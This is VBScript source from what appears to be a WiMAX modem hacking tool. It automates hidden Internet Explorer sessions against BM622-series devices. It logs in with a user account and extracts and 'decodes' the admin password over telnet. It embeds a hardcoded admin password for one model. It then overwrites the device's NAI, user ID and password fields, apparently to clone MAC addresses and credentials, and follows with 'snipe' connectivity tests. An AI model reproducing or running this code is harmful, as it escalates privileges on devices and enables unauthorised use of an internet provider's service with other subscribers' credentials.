''getTabInfoBody = ieObject.document.getElementByID("contentfrm").contentWindow.document.body.innerHTML 
''getTabInfoBody = ieObject.document.getElementByID("contentfrm").contentWindow.document.All("Device").innerHTML
''getTabInfoBody = ieObject.document.getElementByID("LoginForm").innerHTML
setTableId = ieObject.document.getElementsByTagName("table")(1).innerHTML
''getTabInfoBody = ieObject.document.getElementsByTagName("table") 
Set re = New RegExp
re.IgnoreCase= True
re.Global = True
stringPatternRegEx = "<script([^'"& chr(34) &"]|"& chr(34)&"" &"[^"& chr(34) &"]*"& chr(34)&"" &"|'[^']*')*?<"& "/script>"
re.Pattern = stringPatternRegEx
setTableId = re.Replace(setTableId, " ")
MsgBox setTableId
getTabInfoBody = setTableId
'For Each Elem In setTableId(1)
'getTabInfoBody = Elem.innerHTML
'MsgBox getTabInfoBody
'Next
Sleeper 1000
If Err.Number = 0 Then
If getTabInfoBody <> "" Then
getTabInfoBody = Replace(getTabInfoBody, vbCr, "")
getTabInfoBody = Replace(getTabInfoBody, vbLf, "")
getTabInfoBody = Replace(getTabInfoBody, "&nbsp;", " ")
getTabInfoBody = Replace(getTabInfoBody, "<", " ")
getTabInfoBody = Replace(getTabInfoBody, ">", " ")
MsgBox getTabInfoBody
Save2File getTabInfoBody, "savePageLoginForm.txt"
Sleeper 1000
TestObjectGetLoginForm = True
Else
TestObjectGetLoginForm = False
Err.Clear
End If
Else 
TestObjectGetLoginForm = False
Err.Clear
End If 
End Function
''
''
Function TestObjectDeviceInfoTableSixTTMIpScan(ieObject)
On Error Resume Next
''Set setTableInfo = ieObject.document.getElementByID("contentfrm").contentWindow.document.body.innerHTML
''getTabInfoBody = ieObject.document.getElementByID("contentfrm").contentWindow.document.body.innerHTML 
''getTabInfoBody = ieObject.document.getElementByID("contentfrm").contentWindow.document.All("Device").innerHTML
getTabInfoBody = ieObject.document.getElementByID("Device").innerHTML
Sleeper 1000
If Err.Number = 0 Then
If getTabInfoBody <> "" Then
getTabInfoBody = Replace(getTabInfoBody, vbCr, "")
getTabInfoBody = Replace(getTabInfoBody, vbLf, "")
getTabInfoBody = Replace(getTabInfoBody, "&nbsp;", " ")
getTabInfoBody = Replace(getTabInfoBody, "<", " ")
getTabInfoBody = Replace(getTabInfoBody, ">", " ")
Save2File getTabInfoBody, "savePage.txt"
Sleeper 1000
TestObjectDeviceInfoTableSixTTMIpScan = True
Else
TestObjectDeviceInfoTableSixTTMIpScan = False
Err.Clear
End If
Else 
TestObjectDeviceInfoTableSixTTMIpScan = False
Err.Clear
End If 
End Function
''
''
Function TestObjectDeviceInfoTableCheckOnly(ieObject)
On Error Resume Next
''Set setTableInfo = ieObject.document.getElementByID("contentfrm").contentWindow.document.body.innerHTML
''getTabInfoBody = ieObject.document.getElementByID("contentfrm").contentWindow.document.body.innerHTML
getTabInfoBody = ieObject.document.getElementByID("contentfrm").contentWindow.document.All("Device").innerHTML
Sleeper 1000
If Err.Number = 0 Then
If getTabInfoBody <> "" Then
TestObjectDeviceInfoTableCheckOnly = True
Else
TestObjectDeviceInfoTableCheckOnly = False
Err.Clear
End If
Else 
TestObjectDeviceInfoTableCheckOnly = False
Err.Clear
End If 
End Function
''
''
''
Function TestObjectDeviceInfoTableSixToToM(ieObject)
On Error Resume Next
''Set setTableInfo = ieObject.document.getElementByID("contentfrm").contentWindow.document.body.innerHTML
''getTabInfoBody = ieObject.document.getElementByID("contentfrm").contentWindow.document.body.innerHTML
''ieObject.document.getElementByID("contentfrm").contentWindow.document.All("List_Auth")
Set setDeviceInfoLink = ieObject.document.getElementByID("tabfrm").contentWindow.document.All("link_User_0_0_0")
linkhref =  setDeviceInfoLink.href
''Sleeper 1000
If Err.Number = 0 Then
If linkhref <> "" Then
''MsgBox linkhref
''Save2File getTabInfoBody, "savePage.txt"
''Sleeper 1000
TestObjectDeviceInfoTableSixToToM = True
Exit Function
Else
TestObjectDeviceInfoTableSixToToM = False
Err.Clear
End If
Else 
TestObjectDeviceInfoTableSixToToM = False
Err.Clear
End If 
End Function
''
''
Sub ChangeSecurityOnly 
''If Ping(Trim(inputTelnetHost.value)) Then
DisplayLogChangeMAConly "Checking  " & inputTelnetHost.value & " Please WAIT...."
If PingHostLoop Then
'MsgBox "live"
'Exit Sub
If inputNai.value <> "Enter NAI here" And inputUserId.value <> "Enter UserId here" And inputDomainPassword.value <> "Enter Password here" Then
If inputNai.value <> " Invalid MAC" And inputUserId.value <> " Invalid MAC" And inputDomainPassword.value <> " Invalid MAC" Then


''
''Begin Get 622 2011 pass

bm6222011AdminPass =""
successUserLogin = False
If radiobtnBm6222011.checked Then
If radiobtnWebAdminCus.Checked And inputWebAdminPassowrd.value <> Trim("[ Forbidden ]") Then
DisplayLogChangeMAConly "CUSTOMIZE Admin Password is ENABLED. (Password Generation aborted.....)"
bm6222011AdminPass = Trim(inputWebAdminPassowrd.value)
Else
''
successUserLogin = LoginWebToGetPass(inputTelnetHost.value ,1)
Sleeper 1000
If successUserLogin Then
ConnectToTST6222011GetPass(1)
DisplayLogChangeMAConly "Checking extracted password result......"

Sleeper 1000
If GetBM6222011PassFromFile <> "NOT FOUND" Then	
bm6222011AdminPass = GetBM6222011PassFromFile
ClearSaveWebPage("TelnetOutPutCmndGetPass.txt")
Sleeper 1000
ClearSaveWebPage("TelnetInputCmndGetPass.txt")
DisplayLogChangeMAConly "DECODED Admin pass: " & bm6222011AdminPass

Else
ClearSaveWebPage("TelnetOutPutCmndGetPass.txt")
Sleeper 1000
ClearSaveWebPage("TelnetInputCmndGetPass.txt")
DisplayLogChangeMAConly "Cannot retrieve Admin Password......"
Exit Sub
End If
Else 
DisplayLogChangeMAConly "Cannot ACCESS WEB Admin using USER account."
Exit Sub
End If
''
End If
End If 
''End Get 622 2011 pass
''


Set IE = CreateObject("InternetExplorer.Application")
''Set activateIE = CreateObject("WScript.Shell")          
IE.Width = 200
IE.Height = 300
IE.Left = 0
IE.Top = 0 
IE.AddressBar = False
IE.MenuBar = False
IE.Toolbar = False
IE.Visible = 0
DisplayLogChangeMAConly "Accessing  " & inputTelnetHost.value & " Please WAIT!...."
'IE.navigate "http://192.168.254.1" 
IE.navigate "http://" & inputTelnetHost.value 	
On Error Resume Next
''
''
WaitIEtoLoad(IE)
'Set setUserName = IE.document.getElementByID("txt_Username") 
'setUserName.Value = Trim(inputWebAdminUname.value) 
''
IsUsernameExist = False
checkCountName = 0
Do
checkCountName = checkCountName + 1
IsUsernameExist = False
WaitIEtoLoad(IE)
IsUsernameExist = TestObjectCheckBtnLogin(IE) ''TestObjectUsername(IE,inputWebAdminUname.value)
If IsUsernameExist Then
DisplayLogChangeMAConly "Accessing Ok...." 	
Set setUserName = IE.document.getElementByID("txt_Username") 
setUserName.Value = inputWebAdminUname.value ''"admin"
Sleeper 1000
'' DisplayLogChangeMAConly "Filling up Username as: " & setUserName.Value
Set setPassword = IE.document.getElementByID("txt_Password")
If radiobtnBm622i2011.checked Then
setPassword.Value = "FG8S_9Sc16tnklTPjn1wfA"
ElseIf radiobtnBm6222011.checked Then
setPassword.Value = bm6222011AdminPass
Else
setPassword.Value = Trim(webUiAdminPassword.value)
End If
If radiobtnWebAdminCus.Checked Then
If inputWebAdminPassowrd.value <> Trim("[ Forbidden ]") then
setPassword.Value = Trim(inputWebAdminPassowrd.value)
End If 
End If
Sleeper 2000
Exit Do
Else
If checkCountName = 3 Or checkCountName = 10 Or checkCountName = 15 Or checkCountName = 25 Then
IE.Refresh
ElseIf checkCountName = 35 Then
DisplayLogChangeMAConly "Sorry failed to ACCESS WEB ADMIN on " & inputTelnetHost.value &"...."
DisplayLogChangeMAConly "Problem in loading LOGIN page on " & inputTelnetHost.value &"...."
DisplayLogChangeMAConly "Try to load your Current MAC. If successfull, USE the CHANGE SECURITY button."
DisplayLogChangeMAConly "If you are USING ROUTER please REMOVE it and DIRECLY connect to WIMAX device." 
createTxtLogError changeMACLog.value  
IE.Quit
Sleeper 1000
Exit Sub
End If
If checkCountName = 17 Then
Sleeper 2000
Dim strTitle : strTitle = UCase(IE.Document.Title)
If InStr(strTitle, "CANNOT") <> 0 OR InStr(strTitle, "CAN'T") <> 0 Then 
''IE6,8,9''If InStr(strTitle, "CANNOT") <> 0 Then 
DisplayLogChangeMAConly "Sorry failed to ACCESS on " & inputTelnetHost.value &"...."
DisplayLogChangeMAConly "Webserver NOT FOUND on " & inputTelnetHost.value &"...."
DisplayLogChangeMAConly "Try to load your Current MAC. If successfull use CHANGE SECURITY button." 
DisplayLogChangeMAConly "If you are USING ROUTER please REMOVE it and DIRECLY connect to WIMAX device." 
createTxtLogError changeMACLog.value  
IE.Quit
Sleeper 1000
Exit Sub
End If
End If

'		MsgBox "Not found"
''Exit Do
End If
Sleeper 2000
Loop While IsUsernameExist = False
IsUsernameExist = False
checkCountName = 0
''
''On Error Resume Next
DisplayLogChangeMAConly "Logging-in...."
Set setBtnLogin = IE.document.getElementByID("btnLogin")
Sleeper 1000 
setBtnLogin.click
Sleeper 3000
WaitIEtoLoad(IE)
checkCountTitle = 0
Do 
'IsURLValid = False
''DisplayLogChangeMAConly IE.Document.Title
Dim strTitleAfterLoginTst : strTitleAfterLoginTst = UCase(IE.Document.Title)
''isTitle = InStr(strTitleAfterLoginTst, "LOGIN") 
''DisplayLogChangeMAConly isTitle
stringResult = InStr(strTitleAfterLoginTst, "LOGIN") 
checkCountTitle = checkCountTitle + 1
If checkCountTitle = 2 Then
DisplayLogChangeMAConly "Waiting to login...."
End If 
''
If checkCountTitle = 8 Then
''IE.Refresh
DisplayLogChangeMAConly "Trying to RECOVER invalid login on " & inputTelnetHost.value &"...."
createTxtLogError changeMACLog.value
Sleeper 1000
IE.navigate "http://" & inputTelnetHost.value 
WaitIEtoLoad(IE)
IsUsernameExist = False
checkCountName = 0
Do
checkCountName = checkCountName + 1
IsUsernameExist = False
WaitIEtoLoad(IE)
IsUsernameExist = TestObjectCheckBtnLogin(IE) ''TestObjectUsername(IE,inputWebAdminUname.value)
If IsUsernameExist Then
Set setUserName = IE.document.getElementByID("txt_Username") 
setUserName.Value = inputWebAdminUname.value ''"admin"
Sleeper 1000
'' DisplayLogChangeMAConly "Filling up Username as: " & setUserName.Value
Set setPassword = IE.document.getElementByID("txt_Password")
If radiobtnBm622i2011.checked Then
setPassword.Value = "FG8S_9Sc16tnklTPjn1wfA"
ElseIf radiobtnBm6222011.checked Then
setPassword.Value = bm6222011AdminPass
Else
setPassword.Value = Trim(webUiAdminPassword.value)
End If
If radiobtnWebAdminCus.Checked Then
If inputWebAdminPassowrd.value <> Trim("[ Forbidden ]") then
setPassword.Value = Trim(inputWebAdminPassowrd.value)
End If 
End If
Sleeper 2000
Set setBtnLoginForTry = IE.document.getElementByID("btnLogin")
Sleeper 1000 
setBtnLoginForTry.click
Sleeper 2000
Exit Do
Else
If checkCountName = 3 Or checkCountName = 10 Or checkCountName = 15 Then
IE.Refresh
Sleeper 2000
ElseIf checkCountName = 25 Then
DisplayLogChangeMAConly "Sorry failed to ACCESS WEB ADMIN on " & inputTelnetHost.value &"...."
DisplayLogChangeMAConly "Problem in loading LOGIN page on " & inputTelnetHost.value &"...."
DisplayLogChangeMAConly "Try to load your Current MAC. If successfull, USE the CHANGE SECURITY button." 
DisplayLogChangeMAConly "If you are USING ROUTER please REMOVE it and DIRECLY connect to WIMAX device." 
createTxtLogError changeMACLog.value  
IE.Quit
Sleeper 1000
Exit Sub
End If
If checkCountName = 6 Then
Sleeper 2000
Dim strTitleTry : strTitleTry = UCase(IE.Document.Title)
If InStr(strTitleTry, "CANNOT") <> 0 OR InStr(strTitleTry, "CAN'T") <> 0 Then 
''IE6,8,9''If InStr(strTitle, "CANNOT") <> 0 Then 
DisplayLogChangeMAConly "Sorry failed to ACCESS on " & inputTelnetHost.value &"...."
DisplayLogChangeMAConly "Webserver NOT FOUND on " & inputTelnetHost.value &"...."
DisplayLogChangeMAConly "Try to load your Current MAC. If successfull use CHANGE SECURITY button." 
DisplayLogChangeMAConly "If you are USING ROUTER please REMOVE it and DIRECLY connect to WIMAX device." 
createTxtLogError changeMACLog.value  
IE.Quit
Sleeper 1000
Exit Sub
End If
End If
'		MsgBox "Not found"
''Exit Do
End If

Loop While IsUsernameExist = False
''
''On Error Resume Next

End If
''
Sleeper 5000 
If checkCountTitle > 12 Then
DisplayLogChangeMAConly "Sorry failed to ACCESS on " & inputTelnetHost.value &"...."
DisplayLogChangeMAConly "Access DENIED on " & inputTelnetHost.value &"...."
DisplayLogChangeMAConly "Tool Version: " & VersionAboutTool
createTxtLogError changeMACLog.value 
IE.Quit
Exit Sub
End If 
Loop While stringResult > 0
Sleeper 1000 

bm6222011AdminPass = ""
DisplayLogChangeMAConly "Login OK...."
DisplayLogChangeMAConly "Accessing Security..."

IsSecurityBtnExist = False
checkCountSecurityBtn = 0
Do
checkCountSecurityBtn = checkCountSecurityBtn + 1
IsSecurityBtnExist = False
WaitIEtoLoad(IE)
IsSecurityBtnExist = TestObjectSecurityBtn(IE)
If IsSecurityBtnExist Then
DisplayLogChangeMAConly "Accessing Security page... Ok!"
Sleeper 2000
Exit Do
Else
If checkCountSecurityBtn = 3 Or checkCountSecurityBtn = 10 Or checkCountSecurityBtn = 15 Then
DisplayLogChangeMAConly "Waiting for Security page to load...."
IE.Refresh
ElseIf checkCountSecurityBtn = 20 Then
DisplayLogChangeMAConly "Sorry failed to ACCESS Security page on " & inputTelnetHost.value &"...."
createTxtLogError changeMACLog.value  
IE.Quit
Sleeper 1000
Exit Sub
End If
End If
Sleeper 2000
Loop While IsSecurityBtnExist = False
IsSecurityBtnExist = False
checkCountSecurityBtn = 0

chkEnableTLS.Disabled = True
chkAllowNai.Disabled = True

If Not chkEnableTLS.Checked Then
''
IsTTLSExist = False
checkCountTTLS = 0
Do
checkCountTTLS = checkCountTTLS + 1
IsTTLSExist = False
WaitIEtoLoad(IE)
IsTTLSExist = TestObjectTTLS(IE)
If IsTTLSExist Then
DisplayLogChangeMAConly "Authentication type is TTLS..."
Sleeper 2000
Exit Do
Else
If checkCountTTLS = 3 Or checkCountTTLS = 10 Or checkCountTTLS = 15 Then
DisplayLogChangeMAConly "Waiting for TLLS to be set...."
IE.Refresh
ElseIf checkCountTTLS = 20 Then
DisplayLogChangeMAConly "Sorry failed to set TTLS on " & inputTelnetHost.value &"...."
createTxtLogError changeMACLog.value  
IE.Quit
Sleeper 1000
Exit Sub
End If
End If
Sleeper 2000
Loop While IsTTLSExist = False
IsTTLSExist = False
checkCountTTLS = 0
''
Else

IsTLSExist = False
checkCountTLS = 0
Do
checkCountTLS = checkCountTLS + 1
IsTLSExist = False
WaitIEtoLoad(IE)
IsTLSExist = TestObjectTLS(IE)
If IsTLSExist Then
DisplayLogChangeMAConly "Authentication type is TLS..."
Sleeper 2000
Exit Do
Else
If checkCountTLS = 3 Or checkCountTLS = 10 Or checkCountTLS = 15 Then
DisplayLogChangeMAConly "Waiting for TLS to be set...."
IE.Refresh
ElseIf checkCountTLS = 20 Then
DisplayLogChangeMAConly "Sorry failed to set TLS on " & inputTelnetHost.value &"...."
createTxtLogError changeMACLog.value  
IE.Quit
Sleeper 1000
Exit Sub
End If
End If
Sleeper 2000
Loop While IsTLSExist = False
IsTLSExist = False
checkCountTLS = 0
End If
'MsgBox "Success"
'Exit Sub
Sleeper 3000
If chkAllowNai.Checked Then 
'Msgbox "NAI changes is ALLOWED."
''IE6,8,9 Set setNAI = IE.document.frames("contentfrm").document.All("Anony_Item")
Set setNAI = IE.document.getElementByID("contentfrm").contentWindow.document.All("Anony_Item")
''setNAI.Value = UCase(inputNai.value) & drpDwnNaiDomain.value
setNAI.Value = inputNai.value & drpDwnNaiDomain.value
''DisplayLogChangeMAConly"Filling up NAI as: " & setNAI.Value
End If
Sleeper 3000
Set setUserId = IE.document.getElementByID("contentfrm").contentWindow.document.All("User_Id")
setUserId.Value = Trim(inputUserId.value) & drpDwnUserIdDomain.value
''DisplayLogChangeMAConly "Filing up UserId as: " & setUserId.Value
Sleeper 3000
''content - Microsoft Internet Explorer
Set setUserPasswd = IE.document.getElementByID("contentfrm").contentWindow.document.All("User_Password")
setUserPasswd.Value = Trim(inputDomainPassword.value)
''DisplayLogChangeMAConly "Filling up Password as: " & setUserPasswd.Value
Sleeper 3000
''
'If chkEnableTLS.Checked Then
''Msgbox "NAI changes is ALLOWED."
'Set setTLS = IE.document.getElementByID("contentfrm").contentWindow.document.All("List_Auth")
'setTLS.selectedIndex = 0
'setTLS.onchange
'DisplayLogChangeMAConly "Changing Setting.... "
'Sleeper 3000
'End If
''
chkEnableTLS.Disabled = False
chkAllowNai.Disabled = False
DisplayLogChangeMAConly "NOTE: Press OK button on window POPUP if NOT working for long period of time...."
'IE.Stop
Set setBtnApply = IE.document.getElementByID("contentfrm").contentWindow.document.All("btnApply")
'CreateObject("WScript.Shell").Run "pressOk.vbs ",0 , False 
'filename = "pressOk.vbs"
'textFilePath = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
'CreateObject("WScript.Shell").Run textFilePath,0 , False
filename = "pressOk.vbs"
currentFolderAndFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
CreateObject("WScript.Shell").Run Chr(34)& currentFolderAndFile & chr(34),0 , False	
''
Sleeper 1000
setBtnApply.click
DisplayLogChangeMAConly "Applying Changes...."
Sleeper 7000
IE.Stop
If Err.Number = 0 Then
IE.Quit
Sleeper 1000
DisplayLogChangeMAConly "Closing IE...." 
Set IE = Nothing
''DisplayLogChangeMAConly "Web ADMIN pass:" & webUiAdminPassword.value
''DisplayLogChangeMAConly "Change settings FINISHED...."
If radiobtnBm622m2012.checked Or radiobtnBm6222011.checked Or radiobtnBm622i2011.checked Then
DisplayLogChangeMAConly("Change settings finish....")
Else
DisplayLogChangeMAConly("Change settings finish...." & vbCr & vbLf & "Web ADMIN pass:" &  Trim(webUiAdminPassword.value))
End If
If hdnStopMacProcess.value = "1" Then
Sleeper 1000
DisplayLogChangeMAConly("Stopping process....Ok!")
hdnStopProcessResult.value = "1"
Exit Sub
End If
''BEGIN Check internet
If radiobtnBm622i2011.checked Then
DisplayLogChangeMAConly("Master MAC + Serial process FINISHED........")
Else
''CheckInternetChangeMAC
''
If CheckInternetChangeMAC Then
Sleeper 1000
DisplayLogChangeMAConly("Success: Connected To Internet!!!")
Else
DisplayLogChangeMAConly("Failed: Not Connected To Internet!!!")
End If
''
End If 
''END check internet
Else
IE.Quit
Sleeper 1000
DisplayLogChangeMAConly "Closing IE...." 
Set IE = Nothing
DisplayLogChangeMAConly "Security Setting change FAILED!!!...." 
DisplayLogChangeMAConly "Check your MAC,Security Fields, Device and etc....." 
'						    WScript.Echo "Error:"
'						    WScript.Echo Err.Number & " Srce: " & Err.Source & " Desc: " &  Err.Description
DisplayLogChangeMAConly "Error #: " & Err.Number & " Source: " & Err.Source & " Desc: " &  Err.Description
Err.Clear
DisplayLogChangeMAConly "Maybe the page takes time to load... And also check your DEVICE CURRENT MAC." 
DisplayLogChangeMAConly "Process aborted.... Please try again.... " 
DisplayLogChangeMAConly "Try to load your Current MAC. If successfull use CHANGE SECURITY button" 
DisplayLogChangeMAConly "Tool Version: " & VersionAboutTool
createTxtLogError changeMACLog.value 
Exit Sub
End If
Else
MsgBox "Please Check your Security Settings."
End If
Else
MsgBox "Please Check your Security Settings."
End If 
Else
changeMACLog.value = "Process aborted.... Please check your CONNECTION if your connected to WIMAX device."
DisplayLogChangeMAConly "If you are USING ROUTER please REMOVE it and DIRECLY connect to WIMAX device."
DisplayLogChangeMAConly "Tool Version: " & VersionAboutTool
TextAreaScrollBottom(changeMACLog.name)
createTxtLogError changeMACLog.value
MsgBox "WIMAX device is unreachable... process aborted. Please check your connection.",16,"Connection Status"
End If
'changeMACLog.value = "ako" & vbCr & vbLf & "text"
'changeMACLog.value =  inputNai.value & drpDwnNaiDomain.value & inputUserId.value & drpDwnUserIdDomain.value & inputDomainPassword.value
'changeMACLog.value = drpDwnNaiDomain.value'& inputUserId.value & drpDwnUserIdDomain.value & inputDomainPassword.value
End Sub
''Begin FUNCTION CHECK INTERNET
Function CheckInternetChangeMAC
''end if stop
''ping google.com test if connected
liveCount = 0
macIsLive = "Dead"
hostToPing = "www.google.com"
hostToPingTwo = "10.4.1.182"
hostToPingThree = "www.cloudflare.com" 
DisplayLogChangeMAConly("Testing internet connection....")
DisplayLogChangeMAConly("PLEASE WAIT while the TESTING is not finish....  Number of tries is: " & snipeTryList.value)
DisplayLogChangeMAConly("DO NOT CLOSE the TOOL in this process. Use STOP to cancel process!!!")
Sleeper 10000
checkTryCount = 0
deadCountHost = 0
Do 
telnetHostLive = False
Sleeper 5000
telnetHostLive = PingCheckInternet(hostToPing)
Sleeper 1000
checkTryCount = checkTryCount + 1
DisplayLogChangeMAConly( "Test try #" & checkTryCount)
''telnetHostLive = Ping("192.168.2.1")
''If	telnetHostLive = False Then
If telnetHostLive Then
liveCount = liveCount + 1
DisplayLogChangeMAConly("Success #" &liveCount& "..... Got a response from " & hostToPing)
Exit Do
Else
deadCountHost = deadCountHost + 1
End If
If deadCountHost  = 2 Then
DisplayLogChangeMAConly("FAILED: No response from " & hostToPing)
DisplayLogChangeMAConly("DO NOT CLOSE the TOOL in this process. Use STOP to CANCEL the TEST!!!")
DisplayLogChangeMAConly("Testing is still on process......")
End If
'If	liveCount > 0  Then
'DisplayLogChangeMAConly("Success #" &liveCount& "..... Got a response from " & hostToPing)
'Exit Do
'End If
''
If (CInt(snipeTryList.value) > 2) Then
If checkTryCount = (CInt(snipeTryList.value)-2) Then
DisplayLogChangeMAConly("Trying to refresh LAN interface....")
RefreshLanInterface
Sleeper 5000
End If
End If 
''
''
If checkTryCount = CInt(snipeTryList.value) Then
DisplayLogChangeMAConly("Trying to refresh LAN interface....")
RefreshLanInterface
Sleeper 5000
DisplayLogChangeMAConly("Trying to ping other WEBSITES....")
If PingCheckInternet(hostToPingTwo)Then
'telnetHostLive = True
'DisplayLogChangeMAConly("Success..... Got a response from " & hostToPingTwo)
'Exit Do
Else
telnetHostLive = False
DisplayLogChangeMAConly("FAILED: No response from " & hostToPingTwo)
Sleeper 5000
End If

If PingCheckInternet(hostToPingThree)Then
telnetHostLive = True
DisplayLogChangeMAConly("Success..... Got a response from " & hostToPingThree)
Exit Do
Else
telnetHostLive = False
DisplayLogChangeMAConly("FAILED: No response from " & hostToPingThree)
End If 

Exit Do
End If 
''
'If checkTryCount =  CInt(snipeTryList.value) Then
'Exit Do
'End If 
If hdnStopMacProcess.value = "1" Then
DisplayLogChangeMAConly("CANCEL internet TEST....Ok!!!")
Sleeper 1000
'createTxtLogError LogContents.value
hdnStopMacProcess.value = "0"
Exit Do
End If
'Loop While checkTryCount <> 4
''Loop While telnetHostLive = False
Loop While Not telnetHostLive

Sleeper 1000
CheckInternetChangeMAC = telnetHostLive
checkTryCount = 0
deadCountHost = 0
liveCount = 0
End Function
''END FUNCTION CHECK INTERNET
''
''BEGIN FUNCTION CHECK INTERNET SNIPE
Function CheckInternetSnipe
liveCount = 0
hostToPing = "www.google.com"
hostToPingTwo = "10.4.1.182"
hostToPingThree = "www.cloudflare.com" 
checkTryCount = 0
deadCountHost = 0
telnetHostLive = False
Do 
telnetHostLive = False
Sleeper 5000
telnetHostLive = PingCheckInternet(hostToPing)
Sleeper 1000
checkTryCount = checkTryCount + 1
DisplayLogMacGenScan( "Test try #" & checkTryCount)
''telnetHostLive = Ping("192.168.2.1")
''If telnetHostLive = False Then
If telnetHostLive Then
liveCount = liveCount + 1
DisplayLogMacGenScan("Success #" &liveCount& "..... Got a response from " & hostToPing)
Exit Do
Else
deadCountHost = deadCountHost + 1
End If
If deadCountHost  = 2 Then
DisplayLogMacGenScan("FAILED: No response from " & hostToPing)
DisplayLogMacGenScan("DO NOT CLOSE the TOOL in this process. Use STOP to CANCEL the TEST!!!")
DisplayLogMacGenScan("Testing is still on process......")
End If
'If telnetHostLive Then
'DisplayLogMacGenScan("Success #" &liveCount& "..... Got a response from " & hostToPing)
'Exit Do
'End If
''
If (CInt(snipeTryList.value) > 2) Then
If checkTryCount = (CInt(snipeTryList.value)-2) Then
DisplayLogMacGenScan("Trying to refresh LAN interface....")
RefreshLanInterface
Sleeper 5000
End If
End If 
''
''
If checkTryCount = CInt(snipeTryList.value) Then
DisplayLogMacGenScan("Trying to refresh LAN interface....")
RefreshLanInterface
Sleeper 5000
DisplayLogMacGenScan("Trying to ping other WEBSITES....")
If PingCheckInternet(hostToPingTwo)Then
''telnetHostLive = True
''DisplayLogMacGenScan("Success..... Got a response from " & hostToPingTwo)
''Exit Do
Else
telnetHostLive = False
DisplayLogMacGenScan("FAILED: No response from " & hostToPingTwo)
Sleeper 5000
End If

If PingCheckInternet(hostToPingThree)Then
telnetHostLive = True
DisplayLogMacGenScan("Success..... Got a response from " & hostToPingThree)
Exit Do
Else
telnetHostLive = False
DisplayLogMacGenScan("FAILED: No response from " & hostToPingThree)
End If 

Exit Do
End If 
''
'If checkTryCount = CInt(snipeTryList.value)  Then ''If checkTryCount = 6 Then '' windows xp should be 3
'Exit Do
'End If 
If hdnStopMacProcess.value = "1" Then
DisplayLogMacGenScan("CANCEL internet TEST....Ok!!!")
Sleeper 1000
'createTxtLogError LogContents.value
hdnStopMacProcess.value = "0"
Exit Do
End If
'Loop While checkTryCount <> 4
''Loop While telnetHostLive = False
Loop While Not telnetHostLive

Sleeper 1000
CheckInternetSnipe = telnetHostLive
checkTryCount = 0
deadCountHost = 0
liveCount = 0
End Function
''END FUNCTION CHECK INTERNET SNIPE
''
''
''BEGIN bm622m change SECURITY Only
''
Sub ChangeSecurityOnlyBmSixToToM
''If Ping(Trim(inputTelnetHost.value)) Then
DisplayLogChangeMAConly "Checking  " & inputTelnetHost.value & " Please WAIT...."
If PingHostLoop Then
'MsgBox "live"
'Exit Sub
If inputNai.value <> "Enter NAI here" And inputUserId.value <> "Enter UserId here" And inputDomainPassword.value <> "Enter Password here" Then
If inputNai.value <> " Invalid MAC" And inputUserId.value <> " Invalid MAC" And inputDomainPassword.value <> " Invalid MAC" Then
Set IE = CreateObject("InternetExplorer.Application")
''Set activateIE = CreateObject("WScript.Shell")          
IE.Width = 200
IE.Height = 300
IE.Left = 0
IE.Top = 0 
IE.AddressBar = False
IE.MenuBar = False
IE.Toolbar = False
IE.Visible = 0
DisplayLogChangeMAConly "Accessing  " & inputTelnetHost.value & " Please WAIT!...."
''
'	checkSixToToM = False
'	macUserIdofSixToToM = ""
'	checkSixToToM = IsSixToToMmac(inputChangeMacOne.value)
''
'IE.navigate "http://192.168.254.1" 
IE.navigate "http://" & inputTelnetHost.value &"/login.html"
On Error Resume Next
''
''
WaitIEtoLoad(IE)
'Set setUserName = IE.document.getElementByID("txt_Username") 
'setUserName.Value = Trim(inputWebAdminUname.value) 
''
IsUsernameExist = False
checkCountName = 0
Do
checkCountName = checkCountName + 1
IsUsernameExist = False
WaitIEtoLoad(IE)
IsUsernameExist = TestObjectCheckBtnLogin(IE) ''TestObjectUsername(IE,inputWebAdminUname.value)
If IsUsernameExist Then
DisplayLogChangeMAConly "Accessing Ok...." 	
DisplayLogChangeMAConly "Login as USER: " & inputWebUserUname.value & " PASS: " & inputWebUserPassowrd.value
Sleeper 1000
Set setUserName = IE.document.getElementByID("txt_Username") 
setUserName.Value = Trim(inputWebUserUname.value) 
Sleeper 1000
Set setPassword = IE.document.getElementByID("txt_Password")
setPassword.Value = Trim(inputWebUserPassowrd.value)
Sleeper 2000
Exit Do
Else
If checkCountName = 3 Or checkCountName = 10 Or checkCountName = 15 Or checkCountName = 25 Then
IE.Refresh
ElseIf checkCountName = 35 Then
DisplayLogChangeMAConly "Sorry failed to ACCESS WEB ADMIN on " & inputTelnetHost.value &"...."
DisplayLogChangeMAConly "Problem in loading LOGIN page on " & inputTelnetHost.value &"...."
DisplayLogChangeMAConly "Try to load your Current MAC. If successfull, USE the CHANGE SECURITY button."
DisplayLogChangeMAConly "If you are USING ROUTER please REMOVE it and DIRECLY connect to WIMAX device." 
createTxtLogError changeMACLog.value  
IE.Quit
Sleeper 1000
Exit Sub
End If
If checkCountName = 17 Then
Sleeper 2000
Dim strTitle : strTitle = UCase(IE.Document.Title)
If InStr(strTitle, "CANNOT") <> 0 OR InStr(strTitle, "CAN'T") <> 0 Then 
''IE6,8,9''If InStr(strTitle, "CANNOT") <> 0 Then 
DisplayLogChangeMAConly "Sorry failed to ACCESS on " & inputTelnetHost.value &"...."
DisplayLogChangeMAConly "Webserver NOT FOUND on " & inputTelnetHost.value &"...."
DisplayLogChangeMAConly "Try to load your Current MAC. If successfull use CHANGE SECURITY button." 
DisplayLogChangeMAConly "If you are USING ROUTER please REMOVE it and DIRECLY connect to WIMAX device." 
createTxtLogError changeMACLog.value  
IE.Quit
Sleeper 1000
Exit Sub
End If
End If

'		MsgBox "Not found"
''Exit Do
End If
Sleeper 2000
If hdnStopMacProcess.value = "1" Then
Sleeper 1000
hdnStopProcessResult.value = "1"
DisplayLogChangeMAConly("Stopping process....Ok!")
IE.Quit
Exit Sub
End If
Loop While IsUsernameExist = False
IsUsernameExist = False
checkCountName = 0
''
''On Error Resume Next
DisplayLogChangeMAConly "Logging-in...."
''begin check username again
Sleeper 1000
Do 
Set setUserNameAgain = IE.document.getElementByID("txt_Username") 
''setUserNameAgain.Value = Trim(inputWebUserUname.value) 
If Trim(setUserNameAgain.Value) <> Trim(inputWebUserUname.value) Then
DisplayLogChangeMAConly "Trying to fillup username...."
setUserNameAgain.Value = Trim(inputWebUserUname.value) 
'Sleeper 300
Set setPasswordAgain = IE.document.getElementByID("txt_Password")
setPasswordAgain.Value = Trim(inputWebUserPassowrd.value)

End If
